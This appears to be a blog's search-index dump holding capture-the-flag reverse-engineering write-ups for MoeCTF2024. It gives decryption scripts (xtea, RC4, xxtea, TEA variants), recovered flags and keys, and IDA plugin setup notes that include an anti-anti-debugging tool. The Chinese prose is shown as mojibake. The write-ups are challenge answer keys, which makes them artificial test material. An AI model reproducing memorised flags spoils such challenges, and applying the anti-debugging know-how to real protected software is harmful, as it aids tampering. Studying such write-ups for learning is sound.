class="hljs-number">0x4d</span>,<span class="hljs-number">0x7a</span>,<span class="hljs-number">0xde</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0xc5</span>,<span class="hljs-number">0xab</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0xac</span>,<span class="hljs-number">0xe8</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0xb6</span>,<span class="hljs-number">0xa4</span>,<span class="hljs-number">0xe</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0x4b</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0xa2</span>,<span class="hljs-number">0xaf</span>,<span class="hljs-number">0x45</span>])<br>key = <span class="hljs-string">b&#x27;th0s_i0_ke9&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>teaé­”æ”¹</tag>
      
      <tag>rc4é­”æ”¹</tag>
      
      <tag>è„±å£³</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDAç›¸å…³</title>
    <link href="/2024/10/16/IDA%E7%9B%B8%E5%85%B3/"/>
    <url>/2024/10/16/IDA%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>æ³¨æ„ä¸è¦æœ‰ä¸­æ–‡è·¯å¾„</p><p>ä¸‹é¢æ˜¯7.7çš„å…¨æ’ä»¶ç‰ˆï¼Œå¥½åƒè¦ä»é˜¿é‡Œç½‘ç›˜ä¸‹</p><p><a href="https://bbs.kanxue.com/thread-276531.htm">https://bbs.kanxue.com/thread-276531.htm</a></p><p>å¾çˆ±ç ´è§£ä¸Šçš„8.3</p><p><a href="https://down.52pojie.cn/Tools/Disassemblers/">https://down.52pojie.cn/Tools/Disassemblers/</a></p><h1 id="ä¸€äº›æ“ä½œ"><a href="#ä¸€äº›æ“ä½œ" class="headerlink" title="ä¸€äº›æ“ä½œ"></a>ä¸€äº›æ“ä½œ</h1><img src="/2024/10/16/IDA%E7%9B%B8%E5%85%B3/1723449748297-a4487684-a910-40c3-8de7-7922c1b5b5b9.png" class="" title="img"><h1 id="æ’ä»¶ç®€å•è¯´æ˜"><a href="#æ’ä»¶ç®€å•è¯´æ˜" class="headerlink" title="æ’ä»¶ç®€å•è¯´æ˜"></a>æ’ä»¶ç®€å•è¯´æ˜</h1><h2 id="findcrypt3"><a href="#findcrypt3" class="headerlink" title="findcrypt3"></a>findcrypt3</h2><p>ç”¨idapyswitché€‰æ‹©æœ‰yara-pythonçš„pyç‰ˆæœ¬ï¼ŒæŠŠfindcrypt3.pyå’Œfindcrypt3.rulesæ”¾åˆ°pluginsç›®å½•</p><h2 id="IDARustDemanager"><a href="#IDARustDemanager" class="headerlink" title="IDARustDemanager"></a>IDARustDemanager</h2><p><a href="https://www.yuque.com/u34082223/swqzq3/asyrepf22ypc4ddp">https://www.yuque.com/u34082223/swqzq3/asyrepf22ypc4ddp</a></p><h2 id="d810"><a href="#d810" class="headerlink" title="d810"></a>d810</h2><p>è¦ç”¨python3.7,7.7å¯è¡Œ</p><h2 id="æ˜“è¯­è¨€"><a href="#æ˜“è¯­è¨€" class="headerlink" title="æ˜“è¯­è¨€"></a>æ˜“è¯­è¨€</h2><p>[<a href="https://bbs.kanxue.com/thread-274271.htm">åŸåˆ›]IDAæ˜“è¯­è¨€åç¼–è¯‘æ’ä»¶E-Decompiler-IDA Proæ’ä»¶åŒº-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><p><a href="https://github.com/fjqisba/E-Decompiler?tab=readme-ov-file">https://github.com/fjqisba/E-Decompiler?tab=readme-ov-file</a></p><p>æœ‰ç¼–è¯‘å¥½çš„æ–‡ä»¶åœ¨releasesï¼ŒæŒ‰æ•™ç¨‹æ¥å°±è¡Œ,ä¸‹é¢æ˜¯7.7çš„patchï¼Œç›®å‰å°±7.7å®Œå…¨é€‚é…,8.3è¿˜æ˜¯æ— æ³•æ˜¾ç¤ºä¸­æ–‡</p><p><a href="https://www.yuque.com/attachments/yuque/0/2024/zip/35612767/1727525756484-a7488b0f-95fb-4d72-94cc-37d90ae6bd6d.zip">ğŸ“ida7.7_patch.zip</a></p><img src="/2024/10/16/IDA%E7%9B%B8%E5%85%B3/1713267818879-98476862-c91c-4ec2-8834-3e6597a91fe8.png" class="" title="img"><h2 id="idagolanghelper"><a href="#idagolanghelper" class="headerlink" title="idagolanghelper"></a>idagolanghelper</h2><p>å¸®åŠ©æ¢å¤goè¯­è¨€çš„ç¬¦å·è¡¨ï¼Œ8.3å¥½åƒé»˜è®¤ä¼šè‡ªåŠ¨æ¢å¤ç¬¦å·è¡¨</p><p><a href="https://github.com/renshareck/IDAGolangHelper_SupportGo1.20">https://github.com/renshareck/IDAGolangHelper_SupportGo1.20</a></p><h2 id="Scylla"><a href="#Scylla" class="headerlink" title="Scylla"></a>Scylla</h2><p>8.3çš„idaä¹Ÿèƒ½ç”¨,ä¸‹é¢çš„ç›®å‰æ˜¯èƒ½ç”¨çš„ï¼Œ7.7è‡ªå¸¦ä½†æ˜¯æ— æ³•æ­£å¸¸ä½¿ç”¨</p><p><a href="https://github.com/notify-bibi/ScyllaHide-IDA7.5">notify-bibi&#x2F;ScyllaHide-IDA7.5: ScyllaHide for IDA7.5; ScyllaHide IDA7.5; It is a really niccccccce anti-anti-debug tool (github.com)</a></p><p>é€‰æ‹©ScyllaHide</p><img src="/2024/10/16/IDA%E7%9B%B8%E5%85%B3/1723448650692-68717c3d-d8c6-4cb7-997c-92604e1d0932.png" class="" title="img"><p>å»åè°ƒè¯•è®¾ç½®</p><img src="/2024/10/16/IDA%E7%9B%B8%E5%85%B3/1723448674509-2126c472-a0d5-4f9a-9976-41a4e4a34730.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MoeCTF2024éƒ¨åˆ†Reä¸Pwn</title>
    <link href="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/"/>
    <url>/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="å…¥é—¨æŒ‡åŒ—"><a href="#å…¥é—¨æŒ‡åŒ—" class="headerlink" title="å…¥é—¨æŒ‡åŒ—"></a>å…¥é—¨æŒ‡åŒ—</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723263301340-fcca3831-c2da-4c5f-a04d-842ce835c2c3.png" class="" title="img"><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273162689-e73d74b2-e945-4f1a-9f31-70d830aec1db.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273152970-ffbb12bc-03ee-457d-a9d5-0545bf3edf76.png" class="" title="img"><h2 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886477905-248a3059-0117-45dc-85fe-c0ad57fe3003.png" class="" title="img"><h2 id="dynamic"><a href="#dynamic" class="headerlink" title="dynamic"></a>dynamic</h2><p>ç¬¬ä¸€ä¸ªå‡½æ•°å°±æ˜¯åŠ å¯†å‡½æ•°</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886744368-63b88a1c-b933-44f2-82e9-47dc1ba38adb.png" class="" title="img"><p>xxtea</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886633287-b0a152ab-b531-4533-b4b0-34e30e17de92.png" class="" title="img"><p>åœ¨æœ€åresultä¸‹æ–­ç‚¹ï¼Œç„¶åå»çœ‹a1æ•°ç»„</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886715827-80f46a61-4abb-437f-8efe-43823463a476.png" class="" title="img"><h2 id="upx-revenge"><a href="#upx-revenge" class="headerlink" title="upx_revenge"></a>upx_revenge</h2><p>ä¿®æ”¹ç‰¹å¾ç vmpä¸ºUPX</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886953397-6e5e2571-8407-4c99-8393-ddfa328d772f.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723887048654-5d7ee7a7-75ff-497b-bb19-0967ca86c63e.png" class="" title="img"><h2 id="xtea"><a href="#xtea" class="headerlink" title="xtea"></a>xtea</h2><p>è¿™é¢˜ç”±äºå¯†æ–‡åªæœ‰ä¸‰ç»„ï¼Œä¸­é—´ä¸€ç»„ä¼šç»è¿‡ä¸¤æ¬¡è§£å¯†</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724069557932-4f6bf624-f24d-48c2-ba82-e0e3e582318a.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">855655493</span>, sum = delta * (<span class="hljs-number">-32</span>);<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        sum += delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-comment">//uint32_t enc[] = &#123;0xA3, 0x69, 0x96, 0x26, 0xBD, 0x78, 0x0B, 0x3D, 0x9D, 0xA5, 0x28, 0x62&#125;;</span><br>    <span class="hljs-type">uint32_t</span> enc[] = &#123;<span class="hljs-number">0x269669a3</span>, <span class="hljs-number">0x3d0b78bd</span>, <span class="hljs-number">0x6228a59d</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>; i&gt;=<span class="hljs-number">0</span>; i-=<span class="hljs-number">1</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (enc[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//moectf2024!!</span><br></code></pre></td></tr></table></figure><h2 id="d0tN3t"><a href="#d0tN3t" class="headerlink" title="d0tN3t"></a>d0tN3t</h2><p>dnspyæ‰“å¼€æ‰¾åˆ°main</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724070504922-2f26684c-27cd-46cf-b0bb-34818b25de07.png" class="" title="img"><p>æœ‰éƒ¨åˆ†ä¸å¯è§å­—ç¬¦è®°å¾—è¿™æ ·å¤„ç†</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724070539054-06914e00-9eae-4a64-a78c-c3cbe94b80f7.png" class="" title="img"><h2 id="rc4"><a href="#rc4" class="headerlink" title="rc4"></a>rc4</h2><p>ä¸¤ä½ä¸€ç»„æ˜¯å¯†æ–‡</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724134162023-5d4880da-855e-43ea-a0b3-e897d861cf92.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">167</span>, <span class="hljs-number">26</span>, <span class="hljs-number">104</span>, <span class="hljs-number">236</span>, <span class="hljs-number">216</span>, <span class="hljs-number">39</span>, <span class="hljs-number">17</span>, <span class="hljs-number">204</span>, <span class="hljs-number">140</span>, <span class="hljs-number">155</span>, <span class="hljs-number">22</span>, <span class="hljs-number">21</span>, <span class="hljs-number">92</span>, <span class="hljs-number">210</span>, <span class="hljs-number">103</span>, <span class="hljs-number">62</span>, <span class="hljs-number">130</span>, <span class="hljs-number">173</span>, <span class="hljs-number">206</span>, <span class="hljs-number">117</span>, <span class="hljs-number">212</span>, <span class="hljs-number">188</span>, <span class="hljs-number">87</span>, <span class="hljs-number">86</span>, <span class="hljs-number">194</span>, <span class="hljs-number">138</span>, <span class="hljs-number">82</span>, <span class="hljs-number">184</span>, <span class="hljs-number">107</span>, <span class="hljs-number">214</span>, <span class="hljs-number">204</span>, <span class="hljs-number">248</span>, <span class="hljs-number">164</span>, <span class="hljs-number">186</span>, <span class="hljs-number">114</span>, <span class="hljs-number">47</span>, <span class="hljs-number">224</span>, <span class="hljs-number">87</span>, <span class="hljs-number">21</span>, <span class="hljs-number">185</span>, <span class="hljs-number">36</span>, <span class="hljs-number">17</span>])<br>key = <span class="hljs-string">b&#x27;RC4_1s_4w3s0m3&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br></code></pre></td></tr></table></figure><h2 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h2><p>å‰ä¸‰ä¸ªkeyé¢˜ç›®æç¤ºäº†</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724134016809-38a78bb2-b62d-4b60-9f41-46c94c599146.png" class="" title="img"><p>æ˜æ˜¾çš„xxteaæ— é­”æ”¹</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724134037564-32a76006-a2cf-4e55-90f8-55220d070aa7.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z&gt;&gt;5^y<span class="hljs-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) &#123;         <br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span> &#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++) &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>) &#123;  <br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span> &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--) &#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">9</span>] = &#123;<span class="hljs-number">0x78e1f564</span>,<span class="hljs-number">0xa835f0e1</span>,<span class="hljs-number">0x512ff34</span>,<span class="hljs-number">0xb0e913fb</span>,<span class="hljs-number">0x89b9a350</span>,<span class="hljs-number">0xc943dab1</span>,<span class="hljs-number">0x1dbc84f</span>,<span class="hljs-number">0xaf16db20</span>,<span class="hljs-number">0x961767ed</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x63656f6d</span>,<span class="hljs-number">0x30326674</span>,<span class="hljs-number">0x21213432</span>,<span class="hljs-number">0xCCFFBBBB</span>&#125;;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">9</span>;<br>    btea(v, -n, k);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i ++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">8</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">16</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">24</span> &amp; <span class="hljs-number">0xff</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h2><p>è¾“å…¥ä¸æ˜ç¡®ä½†æ˜¯å¯ä»¥çŒœæµ‹</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273913162-1f2fc05c-7205-4979-b6ca-8a5f6cda1c6f.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273875357-9cc404c0-2560-4986-b82d-85afe80b2650.png" class="" title="img"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">moectf</span>&#123;<span class="hljs-number">836153</span>a5-<span class="hljs-number">8</span>e00-<span class="hljs-number">49</span>bd-<span class="hljs-number">9</span>c42-caf30620caaf&#125;<br></code></pre></td></tr></table></figure><h2 id="è¿›é˜¶æŒ‡åŒ—"><a href="#è¿›é˜¶æŒ‡åŒ—" class="headerlink" title="è¿›é˜¶æŒ‡åŒ—"></a>è¿›é˜¶æŒ‡åŒ—</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723272863336-615d073c-62bf-4b9d-8449-0d4ac9ea810c.png" class="" title="img"><p>å…ˆç”¨pythonæ±‚å‡ºä¹˜æ³•é€†å…ƒï¼Œæ³¨æ„+ä¼˜å…ˆçº§è¦é«˜äº^</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">0xb5073388</span> , <span class="hljs-number">0xf58ea46f</span> , <span class="hljs-number">0x8cd2d760</span> , <span class="hljs-number">0x7fc56cda</span> , <span class="hljs-number">0x52bc07da</span> , <span class="hljs-number">0x29054b48</span> ,<br><span class="hljs-number">0x42d74750</span> , <span class="hljs-number">0x11297e95</span> , <span class="hljs-number">0x5cf2821b</span> , <span class="hljs-number">0x747970da</span> , <span class="hljs-number">0x64793c81</span>&#125;;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">11</span>;i++)&#123;<br>a[i]=(((a[i]^ (<span class="hljs-number">0xd3906</span>+<span class="hljs-number">0xdeadbeef</span>))- <span class="hljs-number">0xdeadc0de</span>))*<span class="hljs-number">0x8d61d173</span>;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">11</span>;i++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">4</span>;j++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(a[i]&gt;&gt;(<span class="hljs-number">8</span>*j))&amp;<span class="hljs-number">0xff</span>);<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ–è€…ç”¨çˆ†ç ´çš„æ–¹å¼ï¼Œcçˆ†ç ´é€Ÿåº¦æ˜æ˜¾æ¯”pythonå¿«</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">0xb5073388</span> , <span class="hljs-number">0xf58ea46f</span> , <span class="hljs-number">0x8cd2d760</span> , <span class="hljs-number">0x7fc56cda</span> , <span class="hljs-number">0x52bc07da</span> , <span class="hljs-number">0x29054b48</span> ,<br>                      <span class="hljs-number">0x42d74750</span> , <span 